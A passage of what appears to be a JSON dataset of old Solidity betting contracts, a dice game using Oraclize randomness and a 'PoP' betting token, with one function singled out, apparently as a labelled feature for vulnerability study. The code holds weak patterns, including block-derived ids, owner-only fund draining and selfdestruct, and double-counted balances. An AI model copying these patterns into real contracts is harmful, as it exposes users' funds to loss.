SafeMath.div(SafeMath.mul(bet, percent), 100);\n }\n function getLowWinPercent(uint number) public pure returns (uint) {\n require(number >= 2 && number <= NUM_DICE_SIDES, \"Invalid number\");\n if (number == 2) {\n return 1200;\n } else if (number == 3) {\n return 500;\n } else if (number == 4) {\n return 300;\n } else if (number == 5) {\n return 300;\n } else if (number == 6) {\n return 200;\n } else if (number == 7) {\n return 180;\n } else if (number == 8) {\n return 150;\n } else if (number == 9) {\n return 140;\n } else if (number == 10) {\n return 130;\n } else if (number == 11) {\n return 120;\n } else if (number == 12) {\n return 110;\n } else if (number == 13) {\n return 100;\n }\n }\n function getHighWinPercent(uint number) public pure returns (uint) {\n require(number >= 1 && number < NUM_DICE_SIDES, \"Invalid number\");\n if (number == 1) {\n return 100;\n } else if (number == 2) {\n return 110;\n } else if (number == 3) {\n return 120;\n } else if (number == 4) {\n return 130;\n } else if (number == 5) {\n return 140;\n } else if (number == 6) {\n return 150;\n } else if (number == 7) {\n return 180;\n } else if (number == 8) {\n return 200;\n } else if (number == 9) {\n return 300;\n } else if (number == 10) {\n return 300;\n } else if (number == 11) {\n return 500;\n } else if (number == 12) {\n return 1200;\n }\n }\n function processDiceRoll(address player, uint8 roll) private {\n Game storage game = gamesInProgress[player];\n if (game.firstRoll == 0) {\n game.firstRoll = roll;\n game.state = GameState.WaitingForDirection;\n gamesInProgress[player] = game;\n return;\n }\n require(gamesInProgress[player].state == GameState.WaitingForFinalCard,\n \"Invalid game state\");\n uint8 finalRoll = roll;\n uint winnings = 0;\n if (game.direction == BetDirection.High && finalRoll > game.firstRoll) {\n winnings = calculateWinnings(game.bet, getHighWinPercent(game.firstRoll));\n } else if (game.direction == BetDirection.Low && finalRoll < game.firstRoll) {\n winnings = calculateWinnings(game.bet, getLowWinPercent(game.firstRoll));\n }\n uint transferAmount = winnings;\n if (transferAmount > this.balance) {\n if (game.bet < this.balance) {\n transferAmount = game.bet;\n } else {\n transferAmount = SafeMath.div(SafeMath.mul(this.balance, 90), 100);\n }\n }\n balanceInPlay = SafeMath.add(balanceInPlay, game.bet);\n game.finalRoll = finalRoll;\n game.winnings = winnings;\n game.state = GameState.Finished;\n gamesInProgress[player] = game;\n if (transferAmount > 0) {\n game.player.transfer(transferAmount);\n }\n GameFinished(player, game.id, game.bet, game.firstRoll, finalRoll, winnings, transferAmount);\n }\n function rollDie(address player) private returns (bool) {\n bytes32 rollId = oraclize_newRandomDSQuery(0, 7, rngCallbackGas);\n if (failedRolls[rollId] == FAILED_ROLE) {\n delete failedRolls[rollId];\n return false;\n }\n rollIdToGameAddress[rollId] = player;\n return true;\n }\n function __callback(bytes32 rollId, string _result, bytes _proof) public {\n require(msg.sender == oraclize_cbAddress(), \"Only Oraclize can call this method\");\n address player = rollIdToGameAddress[rollId];\n if (player == address(0)) {\n failedRolls[rollId] = FAILED_ROLE;\n return;\n }\n if (oraclize_randomDS_proofVerify__returnCode(rollId, _result, _proof) != 0) {\n Game storage game = gamesInProgress[player];\n if (game.bet > 0) {\n game.player.transfer(game.bet);\n }\n delete gamesInProgress[player];\n delete rollIdToGameAddress[rollId];\n delete failedRolls[rollId];\n GameError(player, game.id, rollId);\n } else {\n uint8 randomNumber = uint8((uint(keccak256(_result)) % NUM_DICE_SIDES) + 1);\n processDiceRoll(player, randomNumber);\n delete rollIdToGameAddress[rollId];\n }\n }\n function transferBalance(address to, uint amount) public onlyOwner {\n to.transfer(amount);\n }\n function cleanupAbandonedGame(address player) public onlyOwner {\n require(player != address(0), \"Invalid player\");\n Game storage game = gamesInProgress[player];\n require(game.player != address(0), \"Invalid game player\");\n game.player.transfer(game.bet);\n delete gamesInProgress[game.player];\n }\n function setRNGCallbackGasConfig(uint gas, uint price) public onlyOwner {\n rngCallbackGas = gas;\n oraclize_setCustomGasPrice(price);\n }\n function setMinBet(uint bet) public onlyOwner {\n minBet = bet;\n }\n function setGameRunning(bool v) public onlyOwner {\n gameRunning = v;\n }\n function setMaxBetThresholdPct(uint v) public onlyOwner {\n maxBetThresholdPct = v;\n }\n function destroyAndSend(address _recipient) public onlyOwner {\n selfdestruct(_recipient);\n }\n}",
  "extract_feature": [
    "function beginGame() public payable {\naddress player = msg.sender;\nuint bet = msg.value;\nrequire(player != address(0), \"Invalid player\");\nrequire(gamesInProgress[player].state == GameState.None\n|| gamesInProgress[player].state == GameState.Finished,\n\"Invalid game state\");\nrequire(gameRunning, \"Game is not currently running\");\nrequire(bet >= minBet && bet <= getMaxBet(), \"Invalid bet\");\nGame memory game = Game({\nid: uint(keccak256(block.number, player, bet)),\nplayer: player,\nstate: GameState.WaitingForFirstCard,\nbet: bet,\nfirstRoll: 0,\nfinalRoll: 0,\nwinnings: 0,\ndirection: BetDirection.None\n});\nbalanceInPlay = SafeMath.add(balanceInPlay, game.bet);\ngamesInProgress[player] = game;\nrequire(rollDie(player), \"Dice roll failed\");\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc68750a970a4fdc0b39"
  },
  "filename": "1986.sol",
  "content": "pragma solidity ^0.4.18;\ncontract PoP{\n using SafeMath for uint256;\n using SafeInt for int256;\n using Player for Player.Data;\n using BettingRecordArray for BettingRecordArray.Data;\n using WrappedArray for WrappedArray.Data;\n using FixedPoint for FixedPoint.Data;\n string public name;\n string public symbol;\n uint8 public decimals;\n address private author;\n event Bet(address player, uint256 betAmount, uint256 betNumber, uint256 gameNumber);\n event Withdraw(address player, uint256 amount, uint256 numberOfRecordsProcessed);\n event EndGame(uint256 currentGameNumber);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n event Burn(address indexed burner, uint256 value);\n event Mined(address indexed miner, uint256 value);\n function PoP() public {\n name = \"PopCoin\";\n symbol = \"PoP\";\n decimals = 18;\n author = msg.sender;\n totalSupply_ = 10000000 * 10 ** uint256(decimals);\n lastBetBlockNumber = 0;\n currentGameNumber = 0;\n currentPot = 0;\n initialSeed = 0;\n minimumWager = kBaseMinBetSize.toUInt256Raw();\n minimumNumberOfBlocksToEndGame = kLowerBoundBlocksTillGameEnd.add(kUpperBoundBlocksTillGameEnd).toUInt256Raw();\n gameHasStarted = false;\n currentMiningDifficulty = FixedPoint.fromInt256(kStartingGameMiningDifficulty);\n unPromisedSupplyAtStartOfCurrentGame_ = totalSupply_;\n nextGameMaxBlock = kUpperBoundBlocksTillGameEnd;\n nextGameMinBlock = kLowerBoundBlocksTillGameEnd;\n currentGameInitialMinBetSize = kBaseMinBetSize;\n }\n FixedPoint.Data _2pi = FixedPoint.Data({val: 26986075409});\n FixedPoint.Data _pi = FixedPoint.Data({val: 13493037704});\n FixedPoint.Data frontWindowAdjustmentRatio = FixedPoint.fromFraction(14, 10);\n FixedPoint.Data backWindowAdjustmentRatio = FixedPoint.fromFraction(175, 100);\n FixedPoint.Data kBackPayoutEndPointInitial = FixedPoint.fromFraction(1, 2);\n FixedPoint.Data kFrontPayoutStartPointInitial = FixedPoint.fromFraction(1, 2);\n uint256 constant kPercentToTakeAsRake = 3;\n uint256 constant kPercentToTakeAsSeed = 9;\n uint256 constant kDeveloperMiningPower = 30;\n uint256 constant kTotalPercent = 100;\n uint8 constant kStartingGameMiningDifficulty = 1;\n uint8 constant kDifficultyWindow = 10;\n FixedPoint.Data kDifficultyDropOffFactor = FixedPoint.fromFraction(8, 10);\n uint256 constant kWeiConstant = 10 ** 18;\n FixedPoint.Data kExpectedFirstGameSize = FixedPoint.fromInt256(Int256(10 * kWeiConstant));\n FixedPoint.Data kExpectedPopCoinToBePromisedPercent = FixedPoint.fromFraction(1, 1000);\n FixedPoint.Data kLowerBoundBlocksTillGameEnd = FixedPoint.fromInt256(6);\n FixedPoint.Data kUpperBoundBlocksTillGameEnd = FixedPoint.fromInt256(80);\n FixedPoint.Data kBaseMinBetSize = FixedPoint.fromInt256(Int256(kWeiConstant/1000));\n FixedPoint.Data kMaxPopMiningPotMultiple = FixedPoint.fromFraction(118709955, 1000000);\n uint256 public lastBetBlockNumber;\n uint256 public minimumNumberOfBlocksToEndGame;\n uint256 public currentPot;\n uint256 public currentGameNumber;\n FixedPoint.Data currentMiningDifficulty;\n uint256 public initialSeed;\n mapping (address => Player.Data) playerCollection;\n BettingRecordArray.Data currentGameBettingRecords;\n WrappedArray.Data gameMetaData;\n mapping (address => uint256) playerInternalWallet;\n FixedPoint.Data public initialBankrollGrowthAmount;\n FixedPoint.Data nextGameInitialMinBetSize;\n FixedPoint.Data currentGameInitialMinBetSize;\n FixedPoint.Data nextGameMaxBlock;\n FixedPoint.Data nextGameMinBlock;\n uint256 bonusSeed;\n uint256 minimumWager;\n uint256 currentBetNumber;\n mapping(address => uint256) popBalances;\n mapping (address => mapping (address => uint256)) internal allowed;\n uint256 totalSupply_;\n uint256 supplyMined_;\n uint256 supplyBurned_;\n uint256 unPromisedSupplyAtStartOfCurrentGame_;\n bool gameHasStarted;\n function startGame () payable public {\n require (msg.sender == author);\n require (msg.value > 0);\n require (gameHasStarted == false);\n initialSeed = initialSeed.add(msg.value);\n currentPot = initialSeed;\n gameHasStarted = true;\n }\n function updateNextGameMinAndMaxBlockUntilGameEnd (uint256 maxBlocks, uint256 minBlocks) public {\n require (msg.sender == author);\n require (maxBlocks > 0);\n require (minBlocks > 0);\n FixedPoint.Data memory nextMaxBlock = FixedPoint.fromInt256(Int256(maxBlocks));\n FixedPoint.Data memory nextMinBlock = FixedPoint.fromInt256(Int256(minBlocks));\n require(nextMaxBlock.cmp(kUpperBoundBlocksTillGameEnd.mul(FixedPoint.fromInt256(2))) != 1);\n require(nextMaxBlock.cmp(kUpperBoundBlocksTillGameEnd.div(FixedPoint.fromInt256(2))) != -1);\n require(nextMinBlock.cmp(kLowerBoundBlocksTillGameEnd.mul(FixedPoint.fromInt256(2))) != 1);\n require(nextMaxBlock.cmp(kLowerBoundBlocksTillGameEnd.div(FixedPoint.fromInt256(2))) != -1);\n nextGameMaxBlock = FixedPoint.fromInt256(Int256(maxBlocks));\n nextGameMinBlock = FixedPoint.fromInt256(Int256(minBlocks));\n }\n function addToRakePool () public payable{\n assert (msg.value > 0);\n playerInternalWallet[this] = playerInternalWallet[this].add(msg.value);\n }\n function bet () payable public {\n require(msg.value >= minimumWager);\n require(gameHasStarted);\n uint256 betAmount = msg.value;\n betAmount = betAmountAfterRakeHasBeenWithdrawnAndProcessed(betAmount);\n if((block.number.sub(lastBetBlockNumber) >= minimumNumberOfBlocksToEndGame) && (lastBetBlockNumber != 0)) {\n processEndGame(betAmount);\n } else if (lastBetBlockNumber == 0) {\n initialBankrollGrowthAmount = FixedPoint.fromInt256(Int256(betAmount.add(initialSeed)));\n }\n emit Bet(msg.sender, betAmount, currentBetNumber, currentGameNumber);\n Player.BettingRecord memory newBetRecord = Player.BettingRecord(msg.sender, currentGameNumber, betAmount, currentBetNumber, currentPot.sub(initialSeed), 0, 0, true);\n Player.Data storage currentPlayer = playerCollection[msg.sender];\n currentPlayer.insertBettingRecord(newBetRecord);\n Player.BettingRecord memory oldGameUnprocessedBettingRecord = currentGameBettingRecords.getNextRecord();\n currentGameBettingRecords.pushRecord(newBetRecord);\n if(oldGameUnprocessedBettingRecord.isActive == true) {\n processBettingRecord(oldGameUnprocessedBettingRecord);\n }\n currentPot = currentPot.add(betAmount);\n currentBetNumber = currentBetNumber.add(1);\n lastBetBlockNumber = block.number;\n FixedPoint.Data memory currentGameSize = FixedPoint.fromInt256(Int256(currentPot));\n FixedPoint.Data memory expectedGameSize = currentMiningDifficulty.mul(kExpectedFirstGameSize);\n minimumNumberOfBlocksToEndGame = calcNumberOfBlocksUntilGameEnds(currentGameSize, expectedGameSize).toUInt256Raw();\n minimumWager = calcMinimumBetSize(currentGameSize, expectedGameSize).toUInt256Raw();\n }\n function getMyBetRecordCount() public view returns(uint256) {\n Player.Data storage currentPlayer = playerCollection[msg.sender];\n return currentPlayer.unprocessedBettingRecordCount();\n }\n function playerPopMining(uint256 recordIndex, bool onlyCurrentGame) public view returns(uint256) {\n Player.Data storage currentPlayer = playerCollection[msg.sender];\n return computeAmountToMineForBettingRecord(currentPlayer.getBettingRecordAtIndex(recordIndex), onlyCurrentGame).mul(kTotalPercent - kDeveloperMiningPower).div(kTotalPercent);\n }\n function getBetRecord(uint256 recordIndex) public view returns(uint256, uint256, uint256) {\n Player.Data storage currentPlayer = playerCollection[msg.sender];\n Player.BettingRecord memory bettingRecord = currentPlayer.getBettingRecordAtIndex(recordIndex);\n return (bettingRecord.gamePotBeforeBet, bettingRecord.wagerAmount, bettingRecord.gameId);\n }\n function withdraw (uint256 withdrawCount) public returns(bool res) {\n Player.Data storage currentPlayer = playerCollection[msg.sender];\n uint256 playerBettingRecordCount = currentPlayer.unprocessedBettingRecordCount();\n uint256 numberOfIterations = withdrawCount < playerBettingRecordCount ? withdrawCount : playerBettingRecordCount;\n if(numberOfIterations == 0) {return;}\n numberOfIterations = numberOfIterations.add(1);\n for (uint256 i = 0 ; i < numberOfIterations; i = i.add(1)) {\n Player.BettingRecord memory unprocessedRecord = currentPlayer.getNextRecord();\n processBettingRecord(unprocessedRecord);\n }\n uint256 playerBalance = playerInternalWallet[msg.sender];\n playerInternalWallet[msg.sender] = 0;\n if(playerBalance == 0) {\n return true;\n }\n emit Withdraw(msg.sender, playerBalance, numberOfIterations);\n if(!msg.sender.send(playerBalance)) {\n playerInternalWallet[msg.sender] = playerBalance;\n return false;\n }\n return true;\n }\n function getCurrentMiningDifficulty() public view returns(uint256){\n return UInt256(currentMiningDifficulty.toInt256());\n }\n function getPlayerInternalWallet() public view returns(uint256) {\n return playerInternalWallet[msg.sender];\n }\n function getWinningsForRecordId(uint256 recordIndex, bool onlyWithdrawable, bool onlyCurrentGame) public view returns(uint256) {\n Player.Data storage currentPlayer = playerCollection[msg.sender];\n Player.BettingRecord memory record = currentPlayer.getBettingRecordAtIndex(recordIndex);\n if(onlyCurrentGame && record.gameId != currentGameNumber) {\n return 0;\n }\n return getWinningsForRecord(record, onlyWithdrawable);\n }\n function getWinningsForRecord(Player.BettingRecord record, bool onlyWithdrawable) private view returns(uint256) {\n if(onlyWithdrawable && recordIsTooNewToProcess(record)) {\n return 0;\n }\n uint256 payout = getPayoutForPlayer(record).toUInt256Raw();\n payout = payout.sub(amountToSeedNextRound(payout));\n return payout.sub(record.withdrawnAmount);\n }\n function totalAmountRaked () public constant returns(uint256 res) {\n return playerInternalWallet[this];\n }\n function betAmountAfterRakeHasBeenWithdrawnAndProcessed (uint256 betAmount) private returns(uint256 betLessRake){\n uint256 amountToRake = amountToTakeAsRake(betAmount);\n playerInternalWallet[this] = playerInternalWallet[this].add(amountToRake);\n return betAmount.sub(amountToRake);\n }\n function amountToSeedNextRound (uint256 value) private pure returns(uint256 res) {\n return value.mul(kPercentToTakeAsSeed).div(kTotalPercent);\n }\n function addToBonusSeed () public payable {\n require (msg.value > 0);\n bonusSeed = bonusSeed.add(msg.value);\n }\n function amountToTakeAsRake (uint256 value) private pure returns(uint256 res) {\n return value.mul(kPercentToTakeAsRake).div(kTotalPercent);\n }\n function amountOfPopDeveloperShouldMine (uint256 value) private pure returns(uint256 res) {\n return value.mul(kDeveloperMiningPower).div(kTotalPercent);\n }\n function processEndGame (uint256 lastBetAmount) private {\n emit EndGame(currentGameNumber);\n gameMetaData.push(WrappedArray.GameMetaDataElement(currentPot, initialSeed, initialBankrollGrowthAmount.toUInt256Raw(), unPromisedSupplyAtStartOfCurrentGame_, currentMiningDifficulty, true));\n kUpperBoundBlocksTillGameEnd = nextGameMaxBlock;\n kLowerBoundBlocksTillGameEnd = nextGameMinBlock;\n unPromisedSupplyAtStartOfCurrentGame_ = unPromisedPop();\n initialSeed = amountToSeedNextRound(currentPot).add(bonusSeed);\n bonusSeed = 0;\n currentPot = initialSeed;\n currentMiningDifficulty = calcDifficulty();\n initialBankrollGrowthAmount = FixedPoint.fromInt256(Int256(lastBetAmount.add(initialSeed)));\n currentGameBettingRecords.resetIndex();\n currentGameNumber = currentGameNumber.add(1);\n }\n function processBettingRecord (Player.BettingRecord record) private {\n Player.Data storage currentPlayer = playerCollection[record.playerAddress];\n if(currentPlayer.containsBettingRecordFromId(record.bettingRecordId) == false) {\n return;\n }\n Player.BettingRecord memory bettingRecord = currentPlayer.getBettingRecordForId(record.bettingRecordId);\n currentPlayer.deleteBettingRecordForId(bettingRecord.bettingRecordId);\n uint256 bettingRecordValue = getWinningsForRecord(bettingRecord, true);\n uint256 amountToMineForBettingRecord = computeAmountToMineForBettingRecord(bettingRecord, false);\n if(bettingRecord.gameId == currentGameNumber) {\n bettingRecord.withdrawnAmount = bettingRecord.withdrawnAmount.add(bettingRecordValue);\n bettingRecord.withdrawnPopAmount = bettingRecord.withdrawnPopAmount.add(amountToMineForBettingRecord);\n currentPlayer.insertBettingRecord(bettingRecord);\n }\n minePoP(bettingRecord.playerAddress, amountToMineForBettingRecord);\n playerInternalWallet[bettingRecord.playerAddress] = playerInternalWallet[bettingRecord.playerAddress].add(bettingRecordValue);\n }\n function potAmountForRecord (Player.BettingRecord record) private view returns(uint256 potAmount) {\n require(record.gameId <= currentGameNumber);\n if(record.gameId < currentGameNumber) {\n return gameMetaData.itemAtIndex(record.gameId).totalPotAmount;\n } else {\n return currentPot;\n }\n }\n function recordIsTooNewToProcess (Player.BettingRecord record) private view returns(bool res) {\n uint256 potAtBet = record.gamePotBeforeBet.add(record.wagerAmount);\n if(record.gameId == currentGameNumber) {\n uint256 halfPot = currentPot.sub(initialSeed).div(2);\n if(potAtBet >= halfPot) {\n return true;\n }\n }\n return false;\n }\n function UInt256 (int256 elem) private pure returns(uint256 res) {\n assert(elem >= 0);\n return uint256(elem);\n }\n function Int256 (uint256 elem) private pure returns(int256 res) {\n assert(int256(elem) >= 0);\n return int256(elem);\n }\n function getBankRollGrowthForGameId (uint256 gameId) private view returns(FixedPoint.Data res) {\n if(gameId == currentGameNumber) {\n return FixedPoint.fromInt256(Int256(currentPot)).div(initialBankrollGrowthAmount);\n } else {\n WrappedArray.GameMetaDataElement memory elem = gameMetaData.itemAtIndex(gameId);\n return FixedPoint.fromInt256(Int256(elem.totalPotAmount)).div(FixedPoint.fromInt256(Int256(elem.initialBet)));\n }\n }\n function getSeedAmountForGameId (uint256 gameId) private view returns(FixedPoint.Data res) {\n if(gameId == currentGameNumber) {\n return FixedPoint.fromInt256(Int256(initialSeed));\n } else {\n WrappedArray.GameMetaDataElement memory elem = gameMetaData.itemAtIndex(gameId);\n return FixedPoint.fromInt256(Int256(elem.seedAmount));\n }\n }\n function getPayoutForPlayer(Player.BettingRecord playerRecord) internal view returns (FixedPoint.Data) {\n FixedPoint.Data memory frontWindowAdjustment = getWindowAdjustmentForGameIdAndRatio(playerRecord.gameId, frontWindowAdjustmentRatio);\n FixedPoint.Data memory backWindowAdjustment = getWindowAdjustmentForGameIdAndRatio(playerRecord.gameId, backWindowAdjustmentRatio);\n FixedPoint.Data memory backPayoutEndPoint = kBackPayoutEndPointInitial.div(backWindowAdjustment);\n FixedPoint.Data memory frontPayoutSizePercent = kFrontPayoutStartPointInitial.div(frontWindowAdjustment);\n FixedPoint.Data memory frontPayoutStartPoint = FixedPoint.fromInt256(1).sub(frontPayoutSizePercent);\n FixedPoint.Data memory potAmountData = FixedPoint.fromInt256(Int256(potAmountForRecord(playerRecord)));\n FixedPoint.Data memory frontPercent = FixedPoint.fromInt256(0);\n if(playerRecord.gamePotBeforeBet != 0) {\n frontPercent = FixedPoint.fromInt256(Int256(playerRecord.gamePotBeforeBet)).div(potAmountData.sub(getSeedAmountForGameId(playerRecord.gameId)));\n }\n FixedPoint.Data memory backPercent = FixedPoint.fromInt256(Int256(playerRecord.gamePotBeforeBet)).add(FixedPoint.fromInt256(Int256(playerRecord.wagerAmount))).div(potAmountData.sub(getSeedAmountForGameId(playerRecord.gameId)));\n if(frontPercent.val < backPayoutEndPoint.val) {\n if(backPercent.val <= backPayoutEndPoint.val) {\n return calcWinnings(frontPercent, backPercent, backPayoutEndPoint, _pi.div(backWindowAdjustment), backWindowAdjustment, FixedPoint.fromInt256(0), potAmountData);\n } else if (backPercent.val <= frontPayoutStartPoint.val) {\n return calcWinnings(frontPercent, backPayoutEndPoint, backPayoutEndPoint, _pi.div(backWindowAdjustment), backWindowAdjustment, FixedPoint.fromInt256(0), potAmountData);\n } else {\n return calcWinnings(frontPercent, backPayoutEndPoint, backPayoutEndPoint, _pi.div(backWindowAdjustment), backWindowAdjustment, FixedPoint.fromInt256(0), potAmountData).add(calcWinnings(FixedPoint.fromInt256(0), backPercent.sub(frontPayoutStartPoint), frontPayoutSizePercent, _pi.div(frontWindowAdjustment), frontWindowAdjustment, _pi.div(frontWindowAdjustment), potAmountData));\n }\n } else if (frontPercent.val < frontPayoutStartPoint.val) {\n if (backPercent.val <= frontPayoutStartPoint.val) {\n return FixedPoint.fromInt256(0);\n } else {\n return calcWinnings(FixedPoint.fromInt256(0), backPercent.sub(frontPayoutStartPoint), frontPayoutSizePercent, _pi.div(frontWindowAdjustment), frontWindowAdjustment, _pi.div(frontWindowAdjustment), potAmountData);\n }\n } else {\n return calcWinnings(frontPercent.sub(frontPayoutStartPoint), backPercent.sub(frontPayoutStartPoint), frontPayoutSizePercent, _pi.div(frontWindowAdjustment), frontWindowAdjustment, _pi.div(frontWindowAdjustment), potAmountData);\n }\n }\n function getWindowAdjustmentForGameIdAndRatio(uint256 gameId, FixedPoint.Data adjustmentRatio) internal view returns (FixedPoint.Data) {\n FixedPoint.Data memory growth = getBankRollGrowthForGameId(gameId);\n FixedPoint.Data memory logGrowthRate = growth.ln();\n return growth.div(adjustmentRatio.pow(logGrowthRate));\n }\n function integrate(FixedPoint.Data x, FixedPoint.Data a) internal pure returns (FixedPoint.Data) {\n return a.mul(x).sin().div(a).add(x);\n }\n function calcWinnings(FixedPoint.Data playerFrontPercent, FixedPoint.Data playerBackPercent, FixedPoint.Data sectionPercentSize, FixedPoint.Data sectionRadiansSize, FixedPoint.Data windowAdjustment, FixedPoint.Data sectionOffset, FixedPoint.Data potSize) internal view returns (FixedPoint.Data) {\n FixedPoint.Data memory startIntegrationPoint = sectionOffset.add(playerFrontPercent.div(sectionPercentSize).mul(sectionRadiansSize));\n FixedPoint.Data memory endIntegrationPoint = sectionOffset.add(playerBackPercent.div(sectionPercentSize).mul(sectionRadiansSize));\n return integrate(endIntegrationPoint, windowAdjustment).sub(integrate(startIntegrationPoint, windowAdjustment)).mul(potSize).mul(windowAdjustment).div(_2pi);\n }\n function computeAmountToMineForBettingRecord (Player.BettingRecord record, bool onlyCurrentGame) internal view returns(uint256 value) {\n if(onlyCurrentGame && record.gameId != currentGameNumber){\n return 0;\n }\n uint256 payout = getPopPayoutForRecord(record).toUInt256Raw();\n return payout.sub(record.withdrawnPopAmount);\n }\n function getPopPayoutForRecord(Player.BettingRecord record) private view returns(FixedPoint.Data value) {\n if(record.isActive == false) {\n return FixedPoint.fromInt256(0);\n }\n return totalTokenPayout(getPotAsFixedPointForGameId(record.gameId).sub(getInitialSeedAsFixedPointForGameId(record.gameId)), getDifficultyAsFixedPointForGameId(record.gameId), getPopRemainingAsFixedPointForGameId(record.gameId), record.wagerAmount, record.gamePotBeforeBet);\n }\n function unMinedPop () private view returns(uint256 res) {\n return totalSupply_.sub(supplyMined_);\n }\n function promisedPop () private view returns(uint256) {\n FixedPoint.Data memory curPot = getPotAsFixedPointForGameId(currentGameNumber);\n FixedPoint.Data memory seed = getInitialSeedAsFixedPointForGameId(currentGameNumber);\n FixedPoint.Data memory difficulty = getDifficultyAsFixedPointForGameId(currentGameNumber);\n FixedPoint.Data memory unpromised = getPopRemainingAsFixedPointForGameId(currentGameNumber);\n uint256 promisedPopThisGame = totalTokenPayout(curPot.sub(seed), difficulty, unpromised, currentPot.sub(seed.toUInt256Raw()), 0).toUInt256Raw();\n return totalSupply_.sub(unPromisedSupplyAtStartOfCurrentGame_).add(promisedPopThisGame);\n }\n function unPromisedPop () private view returns(uint256 res) {\n return totalSupply_.sub(promisedPop());\n }\n function potentiallyCirculatingPop () public view returns(uint256 res) {\n return promisedPop().sub(supplyBurned_);\n }\n function minePoP(address target, uint256 amountToMine) private {\n if(supplyMined_ >= totalSupply_) {\n return;\n }\n uint256 remainingPop = unMinedPop();\n if(amountToMine == 0 || remainingPop == 0) {\n return;\n }\n if(remainingPop < amountToMine) {\n amountToMine = remainingPop;\n }\n uint256 developerMined = amountOfPopDeveloperShouldMine(amountToMine);\n uint256 playerMined = amountToMine.sub(developerMined);\n supplyMined_ = supplyMined_.add(amountToMine);\n popBalances[target] = popBalances[target].add(playerMined);\n popBalances[author] = popBalances[author].add(developerMined);\n emit Mined(target, playerMined);\n emit Transfer(0, target, playerMined);\n emit Mined(author, developerMined);\n emit Transfer(0, author, developerMined);\n }\n function redeemPop (uint256 popToRedeem) public returns(bool res) {\n require(popBalances[msg.sender] >= popToRedeem);\n require(popToRedeem != 0);\n uint256 potentiallyAllocatedPop = potentiallyCirculatingPop();\n require(popToRedeem <= potentiallyAllocatedPop);\n FixedPoint.Data memory redeemRatio = FixedPoint.fromFraction(Int256(popToRedeem), Int256(potentiallyAllocatedPop));\n FixedPoint.Data memory ethPayoutAmount = redeemRatio.mul(FixedPoint.fromInt256(Int256(totalAmountRaked())));\n uint256 payout = ethPayoutAmount.toUInt256Raw();\n require(payout<=totalAmountRaked());\n require(payout <= address(this).balance);\n burn(popToRedeem);\n playerInternalWallet[this] = playerInternalWallet[this].sub(payout);\n playerInternalWallet[msg.sender] = playerInternalWallet[msg.sender].add(payout);\n return true;\n }\n function totalSupply() public view returns (uint256) {\n return promisedPop();\n }\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return popBalances[_owner];\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= popBalances[msg.sender]);\n popBalances[msg.sender] = popBalances[msg.sender].sub(_value);\n popBalances[_to] = popBalances[_to].add(_value);\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= popBalances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n popBalances[_from] = popBalances[_from].sub(_value);\n popBalances[_to] = popBalances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n emit Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public view returns (uint256) {\n return allowed[_owner][_spender];\n }\n function increaseApproval(address _spender, uint _addedValue) public returns (bool) {\n allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function burn(uint256 _value) public {\n require (popBalances[msg.sender] >= _value);\n address burner = msg.sender;\n supplyBurned_ = supplyBurned_.add(_value);\n popBalances[burner] = popBalances[burner].sub(_value);\n emit Burn(burner, _value);\n }\n function getInitialSeedAsFixedPointForGameId (uint256 gameId) private view returns(FixedPoint.Data res) {\n if(gameId == currentGameNumber) {\n return FixedPoint.fromInt256(Int256(initialSeed));\n } else {\n WrappedArray.GameMetaDataElement memory elem = gameMetaData.itemAtIndex(gameId);\n return FixedPoint.fromInt256(Int256(elem.seedAmount));\n }\n }\n function getPotAsFixedPointForGameId (uint256 gameId) private view returns(FixedPoint.Data res) {\n if(gameId == currentGameNumber) {\n return FixedPoint.fromInt256(Int256(currentPot));\n } else {\n WrappedArray.GameMetaDataElement memory elem = gameMetaData.itemAtIndex(gameId);\n return FixedPoint.fromInt256(Int256(elem.totalPotAmount));\n }\n }\n function getPopRemainingAsFixedPointForGameId (uint256 gameId) private view returns(FixedPoint.Data res) {\n if(gameId == currentGameNumber) {\n return FixedPoint.fromInt256(Int256(unPromisedSupplyAtStartOfCurrentGame_));\n } else {\n WrappedArray.GameMetaDataElement memory elem = gameMetaData.itemAtIndex(gameId);\n return FixedPoint.fromInt256(Int256(elem.coinsRemaining));\n }\n }\n function getDifficultyAsFixedPointForGameId (uint256 gameId) private view returns(FixedPoint.Data res) {\n if(gameId == currentGameNumber) {\n return currentMiningDifficulty;\n } else {\n WrappedArray.GameMetaDataElement memory elem = gameMetaData.itemAtIndex(gameId);\n return elem.miningDifficulty;\n }\n }\n function calcDifficulty() private view returns (FixedPoint.Data) {\n FixedPoint.Data memory total = FixedPoint.fromInt256(0);\n FixedPoint.Data memory count = FixedPoint.fromInt256(0);\n uint256 j = 0;\n for(uint256 i=gameMetaData.length().sub(1) ; i>=0 && j<kDifficultyWindow; i = i.sub(1)){\n WrappedArray.GameMetaDataElement memory thisGame = gameMetaData.itemAtIndex(i);\n FixedPoint.Data memory thisGamePotSize = FixedPoint.fromInt256(Int256(thisGame.totalPotAmount));\n FixedPoint.Data memory thisCount = kDifficultyDropOffFactor.pow(FixedPoint.fromInt256(Int256(j)));\n total = total.add(thisCount.mul(thisGamePotSize));\n count = count.add(thisCount);\n j = j.add(1);\n if(i == 0) {\n break;\n }\n }\n return total.div(count).div(kExpectedFirstGameSize);\n }\n function getBrAdj(FixedPoint.Data currentPotValue, FixedPoint.Data expectedGameSize) private pure returns (FixedPoint.Data) {\n if(currentPotValue.cmp(expectedGameSize) == -1) {\n return 